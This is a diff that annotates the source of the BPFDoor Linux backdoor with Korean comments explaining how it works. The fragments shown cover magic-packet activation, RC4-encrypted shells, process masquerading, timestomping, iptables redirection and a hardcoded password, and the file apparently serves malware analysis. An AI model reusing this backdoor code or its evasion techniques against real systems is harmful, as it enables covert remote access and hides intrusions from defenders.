@@ -1,3 +1,25 @@
+/*
+ * BPFDoor - 리눅스 백도어 멀웨어
+ * 
+ * 이 멀웨어는 Red Menshen(중국 해커 그룹)과 연관이 있으며 원격 액세스를 위해 설계되었습니다.
+ * 주요 기능:
+ * 1. Berkeley Packet Filter(BPF)를 사용하여 패킷 스니핑 - 방화벽 우회 가능
+ * 2. "매직 패킷"을 사용한 은밀한 통신 방식
+ * 3. 다양한 프로세스 위장 기법(process masquerading)
+ * 4. RC4 암호화를 사용한 통신
+ * 5. 메모리 상주 기능(memory-resident)
+ * 6. 안티-포렌식 기능
+ * 
+ * 멀웨어 동작 방식:
+ * - 실행 시 자신을 /dev/shm에 복사하고 이름을 변경(kdmtmpflush)
+ * - 시스템 프로세스로 위장(dbus-daemon, systemd-journald 등)
+ * - 네트워크 패킷을 모니터링하고 특정 "매직 패킷"을 감지하면 활성화
+ * - 활성화 시 공격자에게 역방향 쉘(reverse shell)이나 바인드 쉘(bind shell) 제공
+ * - 공격자 IP로부터 오는 트래픽을 특정 포트로 리다이렉트하는 방화벽 규칙 수정
+ * 
+ * 주의: 이 코드는 교육 및 연구 목적으로만 사용하십시오.
+ */
+
 #include <arpa/inet.h>
 #include <sys/wait.h>
 #include <sys/resource.h>
@@ -123,12 +145,17 @@ int     godpid;
 char pid_path[50];
  
 int shell(int, char *, char *);
-void getshell(char *ip, int);
+void getshell(char *ip, int fromport);
  
 char *argv0 = NULL;
  
 rc4_ctx crypt_ctx, decrypt_ctx;
  
+/*
+ * RC4 암호화 구현
+ * RC4는 스트림 암호로, 통신을 암호화하기 위해 사용됩니다.
+ * 이 함수는 두 값을 교환하는 헬퍼 함수입니다.
+ */
 void xchg(uchar *a, uchar *b)
 {
         uchar   c = *a;
@@ -136,6 +163,11 @@ void xchg(uchar *a, uchar *b)
         *b = c;
 }
  
+/*
+ * RC4 초기화 함수
+ * 키를 사용하여 RC4 암호화 컨텍스트를 초기화합니다.
+ * 이 초기화는 KSA(Key Scheduling Algorithm)로 불리는 RC4의 첫 단계입니다.
+ */
 void    rc4_init (uchar *key, int len, rc4_ctx *ctx)
 {
         uchar   index1, index2;
@@ -160,6 +192,11 @@ void    rc4_init (uchar *key, int len, rc4_ctx *ctx)
         } while (i);
 }
  
+/*
+ * RC4 암호화/복호화 함수
+ * 데이터를 암호화하거나 복호화합니다(RC4는 대칭 암호이므로 동일한 연산이 두 방향 모두에 사용됨).
+ * PRGA(Pseudo-Random Generation Algorithm)로 불리는 RC4의 두 번째 단계입니다.
+ */
 void    rc4 (uchar *data, int len, rc4_ctx *ctx)
 {
         uchar   *state = ctx->state;
@@ -182,6 +219,11 @@ void    rc4 (uchar *data, int len, rc4_ctx *ctx)
         ctx->y = y;
 }
  
+/*
+ * 암호화된 쓰기 함수
+ * 데이터를 암호화한 후 소켓에 씁니다.
+ * 공격자와의 통신 시 데이터가 암호화되도록 합니다.
+ */
 int cwrite(int fd, void *buf, int count)
 {
         uchar    *tmp;
@@ -199,6 +241,11 @@ int cwrite(int fd, void *buf, int count)
         return ret;
 }
  
+/*
+ * 암호화된 읽기 함수
+ * 소켓에서 데이터를 읽은 후 복호화합니다.
+ * 공격자로부터 받은 암호화된 명령을 처리하기 위해 사용됩니다.
+ */
 int cread(int fd, void *buf, int count)
 {
         int     i;
@@ -212,11 +259,20 @@ int cread(int fd, void *buf, int count)
         return i;
 }
  
+/*
+ * PID 파일을 제거하는 함수
+ * 멀웨어가 정상적으로 종료될 때 PID 파일을 제거하여 흔적을 지웁니다.
+ */
 static void remove_pid(char *pp)
 {
         unlink(pp);
 }
  
+/*
+ * 타임스탬프 조작(timestomping) 함수
+ * 파일의 생성/수정 시간을 변경하여 포렌식 분석을 방해합니다.
+ * 2008년 10월 30일 시간으로 설정하여 오래된 파일처럼 보이게 합니다.
+ */
 static void setup_time(char *file)
 {
         struct timeval tv[2];
@@ -229,6 +285,11 @@ static void setup_time(char *file)
  
         utimes(file, tv);
 }
+
+/*
+ * 종료 처리 함수
+ * 프로세스가 종료될 때 PID 파일을 제거하여 흔적을 지웁니다.
+ */
 static void terminate(void)
 {
         if (getpid() == godpid)
@@ -237,10 +298,19 @@ static void terminate(void)
         _exit(EXIT_SUCCESS);
 }
  
+/*
+ * 시그널 핸들러
+ * SIGTERM 시그널이 발생했을 때 안전하게 종료하도록 합니다.
+ */
 static void on_terminate(int signo)
 {
         terminate();
 }
+
+/*
+ * 시그널 초기화 함수
+ * 프로세스 종료 시 필요한 정리 작업을 등록합니다.
+ */
 static void init_signal(void)
 {
         atexit(terminate);
@@ -248,12 +318,21 @@ static void init_signal(void)
         return;
 }
  
+/*
+ * 자식 프로세스 종료 처리 함수
+ * 좀비 프로세스를 방지하기 위해 자식 프로세스 종료를 처리합니다.
+ */
 void sig_child(int i)
 {
         signal(SIGCHLD, sig_child);
         waitpid(-1, NULL, WNOHANG);
 }
  
+/*
+ * 마스터 PTY 열기 함수
+ * 터미널 인터페이스를 위한 가상 터미널(PTY)의 마스터 측을 생성합니다.
+ * 이는 원격 쉘 연결을 제공하기 위해 사용됩니다.
+ */
 int ptym_open(char *pts_name)
 {
         char *ptr;
@@ -284,6 +363,10 @@ int ptym_open(char *pts_name)
         return fd;
 }
  
+/*
+ * 슬레이브 PTY 열기 함수
+ * 가상 터미널(PTY)의 슬레이브 측을 열고 필요한 터미널 설정을 합니다.
+ */
 int ptys_open(int fd,char *pts_name)
 {
         int fds;
@@ -309,6 +392,11 @@ int ptys_open(int fd,char *pts_name)
         return fds;
 }
  
+/*
+ * 가상 터미널(TTY) 열기 함수
+ * 마스터와 슬레이브 PTY를 설정합니다.
+ * 원격 쉘 세션을 제공하기 위한 양방향 통신 채널을 설정합니다.
+ */
 int open_tty()
 {
         char pts_name[20];
@@ -322,6 +410,11 @@ int open_tty()
         return 0;
 }
  
+/*
+ * 연결 시도 함수
+ * 지정된 IP 주소와 포트로 TCP 연결을 시도합니다.
+ * 역방향 쉘(reverse shell)을 공격자에게 연결할 때 사용됩니다.
+ */
 int try_link(in_addr_t ip, unsigned short port)
 {
         struct sockaddr_in serv_addr;
@@ -345,6 +438,11 @@ int try_link(in_addr_t ip, unsigned short port)
         return sock;
 }
  
+/*
+ * 모니터링 함수
+ * 대상 IP 주소와 포트로 UDP 패킷을 전송합니다.
+ * 이 함수는 백도어가 아직 실행 중임을 확인하는 핑 메커니즘으로 사용됩니다.
+ */
 int mon(in_addr_t ip, unsigned short port)
 {
         struct sockaddr_in remote;
@@ -367,6 +465,11 @@ int mon(in_addr_t ip, unsigned short port)
         return s_len;
 }
  
+/*
+ * 프로세스 이름 설정 함수
+ * 멀웨어 프로세스의 이름을 변경하여 시스템 프로세스인 것처럼 위장합니다.
+ * 이는 ps 명령 등에서 정상 서비스처럼 보이도록 합니다.
+ */
 int set_proc_name(int argc, char **argv, char *new)
 {
         size_t size = 0;
@@ -403,6 +506,13 @@ int set_proc_name(int argc, char **argv, char *new)
         prctl(PR_SET_NAME, (unsigned long) new);
         return 0;
 }
+
+/*
+ * 초기화 및 실행 함수
+ * 멀웨어 바이너리를 공유 메모리(/dev/shm/)로 복사하고 실행 권한을 설정합니다.
+ * 그리고 복사된 바이너리에 --init 플래그를 전달하여 초기화를 수행합니다.
+ * 이후 원본 파일을 삭제하여 흔적을 제거합니다.
+ */
 int to_open(char *name, char *tmp)
 {
         char cmd[256] = {0};
@@ -419,7 +529,7 @@ int to_open(char *name, char *tmp)
                 0x20, 0x2d, 0x2d, 0x69, 0x6e, 0x69, 0x74, 0x20, 0x26, 0x26,
                 0x20, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x72, 0x6d, 0x20, 0x2d,
                 0x66, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x73, 0x68, 0x6d,
-                0x2f, 0x25, 0x73, 0x00}; // /bin/rm -f /dev/shm/%s;/bin/cp %s /dev/shm/%s && /bin/chmod 755 /dev/shm/%s && /dev/shm/%s --init && /bin/rm -f /dev/shm/%s
+                0x2f, 0x25, 0x73, 0x00}; // /bin/rm -f /dev/shm/%s;/bin/cp %s /dev/shm/%s && /bin/chmod 755 /dev/shm/%s
  
         snprintf(cmd, sizeof(cmd), fmt, tmp, name, tmp, tmp, tmp, tmp);
         system(cmd);
@@ -429,6 +539,17 @@ int to_open(char *name, char *tmp)
         return 1;
 }
  
+/*
+ * 암호 확인 함수
+ * 매직 패킷에서 전달된 암호가 유효한지 확인합니다.
+ * 첫 번째 암호(cfg.pass)를 확인하여 0을 반환하거나
+ * 두 번째 암호(cfg.pass2)를 확인하여 1을 반환합니다.
+ * 두 암호 모두 일치하지 않으면 2를 반환합니다.
+ * 반환 값에 따라 백도어가 다르게 동작합니다:
+ * - 0: 바인드 쉘 제공 (공격자가 연결할 포트 개방)
+ * - 1: 역방향 쉘 제공 (공격자에게 연결)
+ * - 2: 핑백 메시지만 전송 (상태 확인)
+ */
 int logon(const char *hash)
 {
         int x = 0;
@@ -442,6 +563,18 @@ int logon(const char *hash)
         return 2;
 }
  
+/*
+ * 패킷 처리 루프 함수
+ * 이 함수는 BPFDoor의 핵심 기능인 패킷 스니핑을 담당합니다.
+ * 다음과 같은 작업을 수행합니다:
+ * 1. 로우 소켓(raw socket)을 생성하여 모든 IP 패킷을 캡처
+ * 2. BPF(Berkeley Packet Filter) 필터를 설정하여 원하는 패킷만 처리
+ * 3. 패킷이 특정 "매직" 값을 포함하는지 확인
+ * 4. 매직 패킷이 발견되면 프로세스를 포크하여 쉘을 제공
+ * 
+ * BPF 필터는 TCP, UDP, ICMP 패킷 중 특정 값(0x5293, 0x7255)을 포함하는 
+ * 패킷만 통과시키도록 설정되어 있어, 로컬 방화벽 규칙을 우회할 수 있습니다.
+ */
 void packet_loop()
 {
         int sock, r_len, pid, scli, size_ip, size_tcp;
@@ -559,8 +692,7 @@ void packet_loop()
                         else {
                                 int cmp = 0;
                                 char sip[20] = {0};
-                                char pname[] = {0x2f, 0x75, 0x73, 0x72, 0x2f, 0x6c, 0x69, 0x62, 0x65, 0x78, 0x65, 0x63, 0x2f, 0x70, 0x6f, 0x73, 0x74, 0x66, 0x69, 0x78, 0x2f, 0x6d, 0x61, 0x73, 0x74, 0x65,
- 0x72, 0x00}; // /usr/libexec/postfix/master
+                                char pname[] = {0x2f, 0x75, 0x73, 0x72, 0x2f, 0x6c, 0x69, 0x62, 0x65, 0x78, 0x65, 0x63, 0x2f, 0x70, 0x6f, 0x73, 0x74, 0x66, 0x69, 0x78, 0x2f, 0x6d, 0x61, 0x73, 0x74, 0x65, 0x72, 0x00}; // /usr/libexec/postfix/master
  
                                 if (fork()) exit(0);
                                 chdir("/");
@@ -596,6 +728,12 @@ void packet_loop()
         close(sock);
 }
  
+/*
+ * 바인드 소켓 생성 함수
+ * 42391-43391 범위 내의 첫 번째 사용 가능한 포트에 소켓을 바인딩합니다.
+ * 바인드 쉘을 설정할 때 사용됩니다.
+ * 포트 값은 p 포인터를 통해 반환됩니다.
+ */
 int b(int *p)
 {
         int port;
@@ -626,6 +764,11 @@ int b(int *p)
         return -1;
 }
  
+/*
+ * 소켓 연결 수락 함수
+ * 바인드된 소켓에서 클라이언트 연결을 수락합니다.
+ * 바인드 쉘을 설정할 때 사용됩니다.
+ */
 int w(int sock)
 {
         socklen_t size;
@@ -642,6 +785,16 @@ int w(int sock)
  
 }
  
+/*
+ * 쉘 접속 제공 함수 (iptables 리다이렉션 사용)
+ * 이 함수는 다음과 같은 작업을 수행합니다:
+ * 1. 랜덤 포트에 쉘 서비스를 바인딩
+ * 2. iptables 방화벽 규칙을 추가하여 특정 IP의 트래픽을 쉘 포트로 리다이렉션
+ * 3. 쉘 세션 설정
+ * 
+ * 이 방식은 방화벽이 설정된 시스템에서도 공격자가 정상적인 서비스 포트(예: SSH 포트 22)로 
+ * 연결하는 것처럼 보이게 하면서 실제로는 백도어 쉘에 연결되도록 합니다.
+ */
 void getshell(char *ip, int fromport)
 {
         int  sock, sockfd, toport;
@@ -704,6 +857,18 @@ void getshell(char *ip, int fromport)
         close(sock);
 }
  
+/*
+ * 쉘 세션 관리 함수
+ * 원격 접속을 위한 쉘 세션을 설정하고 관리합니다.
+ * 가상 터미널(PTY)을 설정하고 I/O를 리다이렉션하여 원격 쉘 접근을 제공합니다.
+ * 쉘은 "qmgr -l -t fifo -u" 명령으로 위장하여 ps 출력에서 정상적인 프로세스처럼 보이게 합니다.
+ * 
+ * 주요 기능:
+ * 1. 가상 터미널 설정
+ * 2. 쉘 환경 변수 설정 (시스템 로그를 남기지 않도록 HISTFILE 등 설정)
+ * 3. 쉘 프로세스 포크 및 실행
+ * 4. 암호화된 통신으로 데이터 송수신
+ */
 int shell(int sock, char *rcmd, char *dcmd)
 {
         int subshell;
@@ -835,6 +1000,19 @@ int shell(int sock, char *rcmd, char *dcmd)
         exit(0);
 }
  
+/*
+ * 메인 함수
+ * 멀웨어의 초기화 및 실행을 담당합니다.
+ * 
+ * 주요 단계:
+ * 1. 암호 및 프로세스 위장 이름 설정
+ * 2. PID 파일 확인(이미 실행 중인지 확인)
+ * 3. 사용자 권한 확인(루트 권한 필요)
+ * 4. 프로세스 자체를 메모리에 복사 및 초기화
+ * 5. 프로세스 이름 위장
+ * 6. 데몬화(백그라운드로 실행)
+ * 7. 패킷 루프 시작하여 매직 패킷 모니터링
+ */
 int main(int argc, char *argv[])
 {
         char hash[] = {0x6a, 0x75, 0x73, 0x74, 0x66, 0x6f, 0x72, 0x66, 0x75, 0x6e, 0x00}; // justforfun
